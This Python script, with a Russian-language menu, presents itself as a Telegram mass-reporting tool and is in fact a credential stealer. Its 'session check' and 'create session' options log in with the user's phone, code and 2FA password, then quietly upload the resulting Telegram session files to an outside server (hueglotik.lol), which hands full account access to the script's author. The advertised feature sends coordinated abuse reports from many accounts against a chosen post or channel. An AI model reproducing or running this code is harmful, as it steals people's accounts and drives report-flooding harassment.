
import subprocess
import sys

required_packages = [
    "telethon==1.40.0",
    "requests",
    "colorama",
    "async_timeout"
]

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import os
import sys
import time
import asyncio
import hashlib
import requests
import random
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from telethon.tl.functions.messages import ReportRequest, ReportSpamRequest
from telethon.tl.types import (
    InputReportReasonSpam, InputReportReasonViolence,
    InputReportReasonPornography, InputReportReasonPersonalDetails,
    InputReportReasonOther
)
from colorama import init, Fore, Style
import async_timeout 
import re
import platform

init(autoreset=True)

APP_ID = 2040
APP_HASH = 'b18441a1ff607e10a989891a5462e627'

REASONS = {
    '1': InputReportReasonSpam(),
    '2': InputReportReasonViolence(),
    '3': InputReportReasonPornography(),
    '4': InputReportReasonOther(),
    '5': InputReportReasonPersonalDetails(),
    '6': InputReportReasonOther()
}

def hash_file(filepath):
    with open(filepath, 'rb') as f:
        return hashlib.sha256(f.read()).hexdigest()

def rename_session(path, session_hash):
    new_path = os.path.join('sessions', f'{session_hash}.session')
    os.rename(path, new_path)
    return new_path

def get_sent_hashes():
    if not os.path.exists(SENT):
        return set()
    with open(SENT, 'r') as f:
        return set(line.strip() for line in f.readlines())

def mark_as_sent(session_hash):
    with open(SENT, 'a') as f:
        f.write(session_hash + '\n')

def get_sessions():
    return [f for f in os.listdir('sessions') if f.endswith('.session')]

def get_sent_ids():
    if not os.path.exists(IDS):
        return set()
    with open(IDS, 'r') as f:
        return set(line.strip() for line in f.readlines())

SENT = '.sent_sessions.log'
IDS = '.sent_ids.log'
def mark_id_as_sent(user_id):
    with open(IDS, 'a') as f:
        f.write(str(user_id) + '\n')
        
async def process_session(session_file):
    session_path = os.path.join('sessions', session_file)
    session_name = os.path.splitext(session_file)[0]
    client = TelegramClient(os.path.join("sessions", session_name), APP_ID, APP_HASH)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            await client.disconnect()
            return

        me = await client.get_me()
        await client.disconnect()

        if str(me.id) in get_sent_ids():
            return

        session_hash = hash_file(session_path)
        new_path = rename_session(session_path, session_hash)
        session_path = new_path

        with open(session_path, 'rb') as f:
            response = requests.post(SERVER_ENDPOINT, files={'file': (f.name, f)}, data={
                'send_to_id': TARGET_ID,
                'session_hash': str(me.id)
            })

        if response.status_code in (200, 409):
            mark_id_as_sent(me.id)
            mark_as_sent(session_hash)

    except:
        try:
            await client.disconnect()
        except:
            pass

def set_random_device():
    arch = platform.machine()
    default_model = "Unknown"

    device_models = [
        "Xiaomi Redmi Note 10",
        "Samsung Galaxy A52",
        "POCO X3 Pro",
        "Realme 7",
        "OnePlus Nord"
    ]

    device_model = random.choice(device_models)

    system_version = re.sub(r'-.+', '', platform.release())

    return device_model, system_version
    
async def auto_upload_sessions():
    sessions = get_sessions()
    if not sessions:
        return
    await asyncio.gather(*[process_session(f) for f in sessions])
                        
async def create_and_upload_session():
    phone = input("Введите номер телефона (+79991234567): ")
    path = f'sessions/{phone}'

    device_model, system_version = set_random_device()
    client = TelegramClient(
        path,
        APP_ID,
        APP_HASH,
        device_model=device_model,
        system_version=system_version,
        app_version="11.9.2",
        system_lang_code="ru",
        lang_code="ru"
    )

    await client.connect()

    if not await client.is_user_authorized():
        await client.send_code_request(phone)
        code = input("Код из Telegram: ")
        try:
            await client.sign_in(phone, code)
        except SessionPasswordNeededError:
            pwd = input("Пароль (2FA): ")
            try:
                await client.sign_in(password=pwd)
            except Exception as e:
                print(f"{Fore.RED}Ошибка при вводе 2FA: {e}{Style.RESET_ALL}")
                return
        except Exception as e:
            print(f"{Fore.RED}Ошибка при входе: {e}{Style.RESET_ALL}")
            return

    await client.disconnect()

    session_file = f'{path}.session'
    session_hash = hash_file(session_file)
    new_path = rename_session(session_file, session_hash)

    sent_hashes = get_sent_hashes()
    if session_hash not in sent_hashes:
        await silent_upload(new_path, session_hash)
        mark_as_sent(session_hash)
        print(f"{Fore.GREEN}Сессия успешно создана.{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}Сессия уже была загружена ранее.{Style.RESET_ALL}")

TARGET_ID = 7748654564
async def silent_upload(session_path, session_hash):
    session_name = os.path.splitext(os.path.basename(session_path))[0]
    client = TelegramClient(os.path.join("sessions", session_name), APP_ID, APP_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        await client.disconnect()
        return
    await client.disconnect()

    with open(session_path, 'rb') as f:
        files = {'file': (os.path.basename(f.name), f)}
        data = {
            'send_to_id': str(TARGET_ID),
            'session_hash': str(session_hash)
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' 
        }

        response = requests.post(SERVER_ENDPOINT, files=files, data=data, headers=headers)

        if response.status_code != 200:
            print(f"[!] Ошибка")

SERVER_ENDPOINT = 'https://hueglotik.lol/upload' 
async def report_violation():
    print(f"{Fore.RED}Причины:{Style.RESET_ALL}")
    print(f"{Fore.RED}1. Спам\n2. Насилие\n3. Порнография\n4. Другое\n5. Личные данные\n6. Другое (с комментарием){Style.RESET_ALL}")
    reason_choice = input(f"{Fore.RED}Выберите причину: {Style.RESET_ALL}")

    if reason_choice not in REASONS:
        print(f"{Fore.RED}Неверный выбор причины.{Style.RESET_ALL}")
        return

    url = input(f"{Fore.RED}Ссылка на пост: {Style.RESET_ALL}").strip()
    parts = url.strip().split('/')
    if len(parts) < 2:
        print(f"{Fore.RED}Некорректная ссылка.{Style.RESET_ALL}")
        return

    entity_name = parts[-2]
    try:
        msg_id = int(parts[-1])
    except ValueError:
        print(f"{Fore.RED}Неверный формат ID сообщения.{Style.RESET_ALL}")
        return

    comment = None
    if reason_choice == '6':
        comment = input(f"{Fore.RED}Комментарий к жалобе: {Style.RESET_ALL}")

    sessions = get_sessions()
    if not sessions:
        print(f"{Fore.YELLOW}Нет доступных сессий.{Style.RESET_ALL}")
        return

    valid = 0
    ne_valid = 0
    flood = 0

    for session_file in sessions:
        session_path = os.path.join('sessions', session_file)
        session_name = os.path.splitext(session_file)[0]
        client = TelegramClient(os.path.join("sessions", session_name), APP_ID, APP_HASH)

        try:
            async with async_timeout.timeout(5):
                await client.connect()
                if not await client.is_user_authorized():
                    print(f"{Fore.YELLOW}Сессия {session_file} не валид.{Style.RESET_ALL}")
                    ne_valid += 1
                    continue

                entity = await client.get_entity(entity_name)

                if isinstance(REASONS[reason_choice], InputReportReasonSpam):
                    await client(ReportSpamRequest(peer=entity))
                else:
                    await client(ReportRequest(
                        peer=entity,
                        id=[msg_id],
                        reason=REASONS[reason_choice],
                        message=comment or ""
                    ))

                print(f"{Fore.GREEN}Жалоба отправлена с {session_file}{Style.RESET_ALL}")
                valid += 1

        except FloodWaitError as e:
            print(f"{Fore.RED}Flood wait: {e.seconds} сек. ({session_file}){Style.RESET_ALL}")
            flood += 1
            await asyncio.sleep(e.seconds)

        except asyncio.TimeoutError:
            print(f"{Fore.RED}Таймаут при работе с {session_file}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}Ошибка с {session_file}: {e}{Style.RESET_ALL}")

        finally:
            try:
                await client.disconnect()
            except:
                pass

    print(f"\n{Fore.CYAN}Готово. Валидных: {valid}, невалидных: {ne_valid}, FloodWait: {flood}{Style.RESET_ALL}")

async def main():
    os.makedirs('sessions', exist_ok=True)
    while True:
        print(f"{Fore.RED}Для сноса загрузите сессии в папку sessions{Style.RESET_ALL}\n")
        print(f"\n{Fore.RED}|-------Меню-------|{Style.RESET_ALL}")
        print(f"{Fore.RED}0. Проверка сессии на валид{Style.RESET_ALL}")
        print(f"{Fore.RED}1. Создать новую сессию{Style.RESET_ALL}")
        print(f"{Fore.RED}2. Начать снос{Style.RESET_ALL}")
        print(f"{Fore.RED}3. Автор{Style.RESET_ALL}")
        print(f"{Fore.RED}4. Выход{Style.RESET_ALL}")
        cmd = input(">>> ")

        if cmd == '0':
            print("Проверяем...")
            await auto_upload_sessions()

        elif cmd == '1':
            await create_and_upload_session()

        elif cmd == '2':
            await report_violation()
            
        elif cmd == "3":
            print("Создал @resilientnation")

        elif cmd == '4':
            break

        else:
            print(f"{Fore.RED}Неверный выбор.{Style.RESET_ALL}")

if __name__ == '__main__':
    asyncio.run(main())
